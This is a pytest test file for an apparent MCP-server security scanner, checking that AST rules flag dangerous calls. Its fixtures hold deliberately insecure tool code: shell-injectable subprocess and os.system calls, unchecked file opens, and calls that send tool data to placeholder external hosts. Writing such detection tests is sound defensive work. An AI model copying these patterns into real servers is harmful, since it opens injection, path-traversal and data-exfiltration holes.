"""Tests for AST-based dangerous-call detection."""

from __future__ import annotations

import textwrap
from pathlib import Path

from mcpscan.models import ScanTarget
from mcpscan.parsers import parse_target
from mcpscan.rules.checks import ast_checks


def _run(tmp_path: Path, source: str):
    src = tmp_path / "server.py"
    src.write_text(textwrap.dedent(source), encoding="utf-8")
    return ast_checks.run(parse_target(ScanTarget(kind="python_source", path=src)))


def _ids(findings) -> list[str]:
    return sorted(f.rule_id for f in findings)


def test_eval_and_exec_flagged(tmp_path: Path) -> None:
    findings = _run(tmp_path, "eval('1+1')\nexec('pass')\n")
    assert _ids(findings) == ["MCP201", "MCP201"]


def test_subprocess_with_tool_param_is_mcp202(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        import subprocess

        @mcp.tool()
        def convert(filename: str) -> str:
            """Convert a file."""
            subprocess.run(f"convert {filename}", shell=True)
            return "ok"
        ''',
    )
    assert _ids(findings) == ["MCP202"]


def test_subprocess_with_tool_param_via_local_variable_is_mcp202(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        import subprocess

        @mcp.tool()
        def convert(filename: str) -> str:
            command = f"convert {filename} out.png"
            subprocess.run(command, shell=True)
            return "ok"
        ''',
    )
    assert _ids(findings) == ["MCP202"]


def test_os_system_with_direct_param_is_mcp202(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        import os

        @server.tool()
        def run(cmd: str) -> int:
            """Run a command."""
            return os.system(cmd)
        ''',
    )
    assert _ids(findings) == ["MCP202"]


def test_subprocess_constant_args_is_mcp203(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        """
        import subprocess
        subprocess.run(["ls", "-la"], check=True)
        """,
    )
    assert _ids(findings) == ["MCP203"]


def test_subprocess_alias_resolved(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        """
        import subprocess as sp
        sp.check_output(["uptime"])
        """,
    )
    assert _ids(findings) == ["MCP203"]


def test_open_with_param_no_containment_is_mcp204(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        @mcp.tool()
        def read_file(path: str) -> str:
            """Read a file."""
            with open(path) as fh:
                return fh.read()
        ''',
    )
    assert _ids(findings) == ["MCP204"]


def test_open_with_containment_check_not_flagged(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        from pathlib import Path

        BASE = Path("/srv/data")

        @mcp.tool()
        def read_file(name: str) -> str:
            """Read a file safely."""
            candidate = (BASE / name).resolve()
            if not candidate.is_relative_to(BASE):
                raise ValueError("outside base")
            with open(candidate) as fh:
                return fh.read()
        ''',
    )
    assert findings == []


def test_containment_check_after_open_does_not_suppress_finding(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        from pathlib import Path

        BASE = Path("/srv/data")

        @mcp.tool()
        def read_file(name: str) -> str:
            candidate = (BASE / name).resolve()
            contents = open(candidate).read()
            if not candidate.is_relative_to(BASE):
                raise ValueError("outside base")
            return contents
        ''',
    )
    assert _ids(findings) == ["MCP204"]


def test_bare_tool_decorator_is_not_assumed_to_be_mcp(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        import subprocess

        @tool
        def build(command: str) -> None:
            subprocess.run(command, shell=True)
        ''',
    )
    assert _ids(findings) == ["MCP203"]


def test_open_outside_tool_not_flagged(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        """
        def helper(path):
            with open(path) as fh:
                return fh.read()
        """,
    )
    assert findings == []


def test_http_post_external_in_tool_is_mcp301(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        import httpx

        @mcp.tool()
        def report(data: str) -> str:
            """Send a report."""
            httpx.put("https://collector.example.org/in", content=data)
            return "sent"
        ''',
    )
    assert _ids(findings) == ["MCP301"]


def test_http_post_to_localhost_not_flagged(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        import requests

        @mcp.tool()
        def ping(data: str) -> str:
            """Ping the local service."""
            requests.post("http://localhost:8080/ping", json={"d": data})
            return "ok"
        ''',
    )
    assert findings == []


def test_urlopen_with_data_in_tool_is_mcp301(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        '''
        import urllib.request

        @mcp.tool()
        def send(payload: bytes) -> None:
            """Send a payload."""
            urllib.request.urlopen("https://sink.example.net/x", data=payload)
        ''',
    )
    assert _ids(findings) == ["MCP301"]


def test_http_post_outside_tool_not_flagged(tmp_path: Path) -> None:
    findings = _run(
        tmp_path,
        """
        import requests
        requests.post("https://api.example.com/telemetry", json={})
        """,
    )
    assert findings == []


def test_vulnerable_fixture_ast_findings(vulnerable_server: Path) -> None:
    parsed = parse_target(
        ScanTarget(kind="python_source", path=vulnerable_server / "server.py")
    )
    ids = _ids(ast_checks.run(parsed))
    assert ids == ["MCP202", "MCP204", "MCP301"]


def test_non_python_target_returns_empty(vulnerable_skill: Path) -> None:
    parsed = parse_target(ScanTarget(kind="skill", path=vulnerable_skill))
    assert ast_checks.run(parsed) == []
